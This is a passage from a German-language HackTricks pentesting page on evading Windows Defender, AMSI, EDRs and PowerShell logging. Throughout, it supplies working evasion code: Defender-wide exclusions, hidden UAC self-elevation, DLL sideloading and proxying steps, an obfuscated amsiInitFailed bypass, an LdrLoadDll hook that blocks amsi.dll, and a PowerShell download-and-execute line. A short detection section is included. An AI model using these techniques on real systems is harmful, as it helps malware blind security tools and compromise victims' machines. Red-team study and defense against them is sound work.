# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender am Funktionieren hindert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender durch das Vortäuschen eines anderen AV am Funktionieren hindert.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Öffentlich verfügbare Loader, die sich als Game Cheats tarnen, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die den Benutzer zunächst **zur Rechteerweiterung auffordern** und erst danach Defender abschalten. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob ein administrativer Kontext vorliegt. Der Befehl ist nur erfolgreich, wenn der Aufrufer über Admin-Rechte verfügt; ein Fehlschlag weist daher darauf hin, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort selbst mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsabfrage auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „gecrackte“ Software installieren, daher wird die Aufforderung normalerweise akzeptiert, wodurch die Malware die erforderlichen Rechte erhält, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteerweiterung maximieren GachiLoader-ähnliche Chains die blinden Flecken von Defender, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt anschließend **extrem weitreichende Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede zukünftige Payload, die irgendwo auf der Festplatte abgelegt wird, ignoriert wird**.
- Der Ausschluss der `.sys`-Erweiterung ist zukunftsorientiert – Angreifer behalten sich die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Phasen bestätigen können, dass die Ausschlüsse bestehen bleiben, oder sie erweitern können, ohne UAC erneut auszulösen.

Da kein Defender-Dienst beendet wird, melden naive Zustandsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitüberprüfung diese Pfade tatsächlich nie berührt.<sup>[[26]](#references)</sup>

## **AV Evasion-Methodik**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei malicious ist oder nicht: statische Erkennung, dynamische Analyse und bei fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch das Markieren bekannter malicious Strings oder Byte-Arrays in einer Binary oder einem Script sowie durch das Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfsumme usw.). Das bedeutet, dass du mit bekannten öffentlichen Tools leichter erwischt werden kannst, da diese wahrscheinlich bereits analysiert und als malicious markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binary verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen. Du benötigst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuscation**

Manchmal musst du lediglich einige Strings in deiner Binary oder deinem Script ändern, damit sie AV passieren. Je nachdem, was du obfuscaten möchtest, kann dies jedoch zeitaufwendig sein.

- **Benutzerdefinierte Tools**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dabei wird die Datei grundsätzlich in mehrere Segmente aufgeteilt und Defender angewiesen, jedes einzelne Segment zu scannen. So kann dir das Tool genau sagen, welche Strings oder Bytes in deiner Binary markiert wurden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binary in einer Sandbox aus und überwacht malicious Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung schlafen** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Workflow des Benutzers nicht unterbrochen wird. Lange Sleeps können daher die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes den Sleep abhängig von seiner Implementierung einfach überspringen können.
- **Ressourcen des Computers prüfen** Normalerweise stehen Sandboxes nur sehr wenige Ressourcen zur Verfügung (z. B. < 2 GB RAM), da sie andernfalls den Computer des Benutzers verlangsamen könnten. Du kannst hier auch sehr kreativ werden, zum Beispiel die Temperatur der CPU oder sogar die Lüftergeschwindigkeit prüfen, da nicht alles in der Sandbox implementiert sein wird.
- **Computerspezifische Prüfungen** Wenn du einen Benutzer anvisieren möchtest, dessen Workstation der Domäne „contoso.local“ beigetreten ist, kannst du die Domäne des Computers prüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Falls nicht, kannst du dein Programm beenden lassen.

Es hat sich herausgestellt, dass der Computername der Microsoft Defender-Sandbox HAL9TH lautet. Du kannst daher vor der Detonation den Computernamen in deiner Malware prüfen. Wenn der Name HAL9TH entspricht, befindest du dich in der Defender-Sandbox, und dein Programm kann beendet werden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a>-Kanal #malware-dev</p></figcaption></figure>

Wie wir bereits zuvor in diesem Beitrag gesagt haben, werden **öffentliche Tools** irgendwann **erkannt**. Daher solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes Projekt verwenden, das weniger bekannt ist und ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz ist es wahrscheinlich eines der – wenn nicht das am häufigsten von AVs und EDRs markierten Malware-Programme. Obwohl das Projekt selbst großartig ist, ist es gleichzeitig ein Albtraum, damit AVs zu umgehen. Suche daher einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, achte darauf, die **automatische Übermittlung von Samples** in Defender zu deaktivieren. Und bitte, im Ernst: **LADE SIE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer es möglich ist, solltest du für Evasion immer **DLLs priorisieren**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **weitaus seltener erkannt** und analysiert. Daher ist dies in manchen Fällen ein sehr einfacher Trick, um Erkennung zu vermeiden (vorausgesetzt, deine Payload kann natürlich als DLL ausgeführt werden).

Wie wir in diesem Bild sehen können, weist eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26 auf, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Opferanwendung als auch die malicious Payload(s) nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell-Script kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu untersuchen**. Diese Technik ist bei ordnungsgemäßer Umsetzung ziemlich unauffällig. Wenn Sie jedoch öffentlich bekannte DLL Sideloadable programs verwenden, können Sie leicht entdeckt werden.

Allein das Platzieren einer schädlichen DLL mit dem Namen, den ein Programm zu laden erwartet, führt nicht dazu, dass Ihr Payload geladen wird, da das Programm bestimmte Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe eines Programms vom Proxy (und der schädlichen) DLL an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und Ihr Payload kann ausgeführt werden.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte ursprüngliche DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) encodiert) als auch die Proxy-DLL haben in [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir das [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippsc's Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das, was wir besprochen haben, im Detail zu erfahren.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu zeigen, enthält der Export-Eintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Caller den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls es noch nicht geladen wurde
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls umfasst, das die Forward-Auflösung durchführt.

Dies ermöglicht eine indirekte Sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die an den Namen eines Nicht-KnownDLL-Moduls weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer von einem Angreifer kontrollierten DLL, die genau wie das weitergeleitete Zielmodul benannt ist. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader den Forward auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein `DllMain` ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Die signierte System-DLL in einen beschreibbaren Ordner kopieren
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine schädliche `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den Forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, wird der Fehler „missing API“ erst ausgegeben, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exporte kannst du mit Tools wie folgt enumerieren:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows-11-Forwarder-Inventar, um nach geeigneten Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Erkennungs-/Abwehrideen:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden und anschließend Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis laden
- Bei Prozess-/Modulketten wie dieser einen Alarm auslösen: `rundll32.exe` → nicht systemgebundene `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Richtlinien zur Codeintegrität (WDAC/AppLocker) erzwingen und Schreib- plus Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe suspendierter Prozesse, direkter Syscalls und alternativer Ausführungsmethoden`

Mit Freeze kannst du deinen Shellcode auf unauffällige Weise laden und ausführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher niemals nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direkte/indirekte Syscalls & SSN-Auflösung (SysWhispers4)

EDRs platzieren häufig **user-mode Inline-Hooks** auf den Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Anweisung in den generierten Stub einfügen (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: In ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar aus `ntdll` stammt (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeiden, dass die statische Opcode-Sequenz `0F 05` auf der Festplatte eingebettet wird; stattdessen eine Syscall-Sequenz zur Laufzeit auflösen.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs durch Sortieren der Syscall-Stubs nach ihrer virtuellen Adresse ableiten, anstatt die Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus deren `.text` auslesen und sie anschließend wieder unmap­pen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Die nach VA sortierte SSN-Ableitung mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf die VA-Ableitung zurückfallen.
- **HW Breakpoint**: DR0 auf der `syscall`-Anweisung setzen und einen VEH verwenden, um die SSN zur Laufzeit aus `EAX` zu erfassen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Ursprünglich waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen tun, da er nicht genügend Einblick hatte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- Benutzerkontensteuerung oder UAC (Erhöhung der Berechtigungen bei der Installation von EXE, COM, MSI oder ActiveX)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirus-Lösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte in einer sowohl unverschlüsselten als auch unobfuskierten Form offengelegt werden.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt unter Windows Defender den folgenden Alert.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, aus der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber aufgrund von AMSI trotzdem im Speicher erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Dies betrifft sogar `Assembly.Load(byte[])`, um die Ausführung im Speicher zu laden. Deshalb wird für die Ausführung im Speicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der zu ladenden Skripte eine gute Möglichkeit sein, eine Erkennung zu umgehen.

AMSI ist jedoch in der Lage, Skripte zu deobfuskieren, selbst wenn sie mehrere Ebenen enthalten. Daher kann Obfuscation abhängig von der Umsetzung eine schlechte Option sein. Dadurch ist es nicht ganz einfach, AMSI zu umgehen. Manchmal reicht es allerdings aus, ein paar Variablennamen zu ändern, und schon funktioniert es. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (sowie cscript.exe, wscript.exe usw.) geladen wird, kann sie leicht manipuliert werden, selbst wenn man als nicht privilegierter Benutzer ausgeführt wird. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, woraufhin Microsoft eine Signatur entwickelt hat, um eine weitere Verbreitung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen erforderlich, um diese Technik nutzen zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird. Du solltest daher keinen Code veröffentlichen, wenn dein Plan darin besteht, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Sie besteht darin, die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll zu finden, die für das Scannen der vom Benutzer bereitgestellten Eingaben zuständig ist, und sie mit Anweisungen zu überschreiben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), um eine ausführlichere Erklärung zu erhalten.

Es gibt außerdem viele weitere Techniken, die verwendet werden, um AMSI mit PowerShell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI durch Verhindern des Ladens von amsi.dll blockieren (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn es sich bei dem angeforderten Modul um `amsi.dll` handelt. Dadurch wird AMSI nie geladen und für diesen Prozess werden keine Scans durchgeführt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loadern (mit allem, was andernfalls AMSI laden würde).
- In Kombination mit dem Zuführen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Command-Line-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen durch zufällig generierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden und eine zufällige Groß- und Kleinschreibung auf PowerShell-Schlüsselwörter anwenden, um Signaturen zu vermeiden.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool scannt den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell version 2 verwenden**
Wenn du PowerShell version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Das kannst du folgendermaßen tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Audit- und Troubleshooting-Zwecke nützlich sein, aber auch ein **Problem für Angreifer darstellen, die eine Erkennung umgehen möchten**.

Um PowerShell logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Sie können dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell version 2 verwenden**: Wenn Sie PowerShell version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass sie von AMSI gescannt werden. Dies können Sie folgendermaßen tun: `powershell.exe -version 2`
- **Eine unmanaged PowerShell session verwenden**: Verwenden Sie [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmechanismen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Runtime und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten. Dadurch wird die Entropie des Binaries erhöht, was es AVs und EDRs erleichtert, dieses zu erkennen. Seien Sie dabei vorsichtig und wenden Sie Verschlüsselung möglicherweise nur auf bestimmte Abschnitte Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

